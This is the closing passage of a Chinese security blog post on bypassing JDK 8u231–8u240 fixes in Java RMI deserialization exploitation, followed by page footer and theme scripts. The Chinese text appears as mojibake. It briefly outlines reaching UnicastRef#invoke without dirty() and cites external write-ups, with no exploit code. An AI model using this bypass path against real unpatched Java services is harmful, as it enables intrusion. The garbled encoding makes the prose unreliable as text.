<h2 id="bypass-8u2318u240">Bypass 8u231~8u240<a hidden class="anchor" aria-hidden="true" href="#bypass-8u2318u240">#</a></h2>
<p>åœ¨8u231ä¹‹å‰æˆ‘ä»¬æ˜¯é€šè¿‡<code>dirty()</code>è¿™é‡Œç»•è¿‡çš„ï¼Œç„¶åè¢«ä¿®å¤äº†ã€‚8u231è¿™é‡Œè¿™æ˜¯é€šè¿‡ç›´æ¥è¾¾åˆ°<code>UnicastRef#invoke</code>ï¼Œä¸ç»è¿‡<code>dirty()</code>ï¼Œä»…é ç¬¬ä¸€æ¬¡ååºåˆ—åŒ–å®Œæˆè¿™äº›æ“ä½œã€‚ä½†æ˜¯ä¸‹ä¸€ä¸ªç‰ˆæœ¬å°±è¢«ä¿®äº†hhhï¼Œå…·ä½“å¯ä»¥å‚è€ƒè¿™ç¯‡https://www.anquanke.com/post/id/259059#h3-10</p>
<p><strong>å‚è€ƒï¼š</strong></p>
<blockquote>
<p><a href="https://xz.aliyun.com/t/8706?time__1311=n4%2BxnD0DcDu0eD5Y40HpDUhEIDkB711H4D#toc-8">https://xz.aliyun.com/t/8706?time__1311=n4%2BxnD0DcDu0eD5Y40HpDUhEIDkB711H4D#toc-8</a></p>
<p><a href="https://www.anquanke.com/post/id/259059#h3-1">https://www.anquanke.com/post/id/259059#h3-1</a></p>
</blockquote>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
<nav class="paginav">
  <a class="prev" href="https://Jiecub3.github.io/zh/posts/java/jndi/">
    <span class="title">Â« ä¸Šä¸€é¡µ</span>
    <br>
    <span>JNDI</span>
  </a>
  <a class="next" href="https://Jiecub3.github.io/zh/posts/java/chain/jdk17cc%E9%93%BE%E4%B8%8B%E5%88%A9%E7%94%A8templatesimpl/">
    <span class="title">ä¸‹ä¸€é¡µ Â»</span>
    <br>
    <span>jdk17&amp;CCé“¾ä¸‹åˆ©ç”¨TemplatesImpl</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2025 <a href="https://Jiecub3.github.io/zh/">Jiecub3</a></span> Â· 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'å¤åˆ¶';

        function copyingDone() {
            copybutton.innerHTML = 'å·²å¤åˆ¶ï¼';
            setTimeout(() => {
                copybutton.innerHTML = 'å¤åˆ¶';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
